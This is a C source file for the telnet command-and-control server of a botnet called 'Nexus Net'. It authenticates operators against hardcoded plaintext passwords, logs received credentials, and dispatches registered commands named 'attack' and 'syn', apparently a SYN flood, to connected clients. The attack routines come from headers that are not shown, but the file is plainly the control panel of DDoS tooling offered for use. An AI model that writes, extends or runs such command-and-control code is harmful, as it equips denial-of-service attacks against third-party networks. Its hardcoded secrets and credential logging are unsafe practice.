// server.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "commands/cman.h"
#include "commands/echo_command.h"
#include "commands/attack_command.h"
#include "commands/help_command.h"
#include "commands/attack/syn_command.h"
#include "commands/info/whois.h"

#define PORT 23
#define TCP 8080
#define MAX_CLIENTS 5
#define BUFFER_SIZE 1024

void handleClient(int serverSocket, int clientSocket);

int com() {
    printf("Communications Starting\n");
}

int cnc() {
    printf("cnc services starting\n");
}

int con() {
    printf("TELNET PORT : %d\n", PORT);
    return 0;
}


#define MAX_USERS 10

typedef struct {
    char username[70];
    char password[70];
    int perm[5];
} User;

int isValidUser(const char* username, const char* password, User* users, int maxUsers) {
    for (int i = 0; i < maxUsers; i++) {
        printf("Comparing with user: %s, password: %s\n", users[i].username, users[i].password);
        printf("Received username: %s, password: %s\n", username, password);
        if (strcmp(users[i].username, username) == 0 && strcmp(users[i].password, password) == 0) {
            return 1;
        }
    }
    return 0;
}




int main() {
    int serverSocket;

    initializeCommandHandler();

    registerCommand("help", executeHelpCommand);
    registerCommand("echo", executeEchoCommand);
    registerCommand("attack", executeAttackcommand);
    registerCommand("syn", executeSyncommand);
    registerCommand("whois", executeWhoiscommand);

    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);

    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == -1) {
        perror("Bind failed");
        close(serverSocket);
        exit(EXIT_FAILURE);
    }

    if (listen(serverSocket, MAX_CLIENTS) == -1) {
        perror("Listen failed");
        close(serverSocket);
        exit(EXIT_FAILURE);
    }

    printf("Nexus Net Starting ... \n");
    con();
    com();
    cnc();

    while (1) {
        int clientSocket = accept(serverSocket, NULL, NULL);
        if (clientSocket == -1) {
            perror("Accept failed");
            close(serverSocket);
            exit(EXIT_FAILURE);
        }

        printf("Client connected\n");

        handleClient(serverSocket, clientSocket);

        close(clientSocket);

        printf("Client disconnected\n");
    }

    close(serverSocket);

    return 0;
}

void handleClient(int serverSocket, int clientSocket) {
    char buffer[BUFFER_SIZE];
    int bytesRead;

    const char* welcomeMsg = "Nexus\r\n";
    send(clientSocket, welcomeMsg, strlen(welcomeMsg), 0);

    #define MAX_USERS 10
    User users[MAX_USERS] = {
        {"arch", "CUUWdlaFVu8WBjnA99Bz", 4},
        {"afterlife", "CDjcHe9P4ooXpYkdC2br", 1}
    };

    const char* userPrompt = "user: ";
    send(clientSocket, userPrompt, strlen(userPrompt), 0);

    bytesRead = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    if (bytesRead <= 0) {
        return;
    }
    buffer[bytesRead] = '\0';

    char username[20];
    if (sscanf(buffer, "%19s", username) != 1) {
        return;
    }

    printf("Received username: %s\n", username);

    const char* passwordPrompt = "password: ";
    send(clientSocket, passwordPrompt, strlen(passwordPrompt), 0);

    bytesRead = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    if (bytesRead <= 0) {
        return;
    }
    buffer[bytesRead] = '\0';

    char password[20];
    if (sscanf(buffer, "%19s", password) != 1) {
        return;
    }

    printf("Received password: %s\n", password);
    printf("Before calling isValidUser. username: %s, password: %s\n", username, password);

    int isValid = isValidUser(username, password, users, MAX_USERS);
    printf("isValidUser: %d\n", isValid);

    if (isValid) {
        printf("Valid username and password\n");
        char* banner =
                    "███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗\r\n"
                    "████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝\r\n"
                    "██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗\r\n"
                    "██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║\r\n"
                    "██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║\r\n"
                    "╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝\r\n"
                    "      --**Welcome To Nexus Network**--- \r\n";
        send(clientSocket, banner, strlen(banner), 0);
        while (1) {
            bytesRead = recv(clientSocket, buffer, BUFFER_SIZE, 0);

            if (bytesRead <= 0) {
                break;
            }

            buffer[bytesRead] = '\0';

            char* newlinePos = strchr(buffer, '\n');
            if (newlinePos != NULL) {
                *newlinePos = '\0';

                executeCommand(clientSocket, buffer);
            } else {
                send(clientSocket, buffer, bytesRead, 0);
            }
        }
    } else {
        const char* errorMsg = "Invalid username or password. Please try again.\r\n";
        send(clientSocket, errorMsg, strlen(errorMsg), 0);
    }
}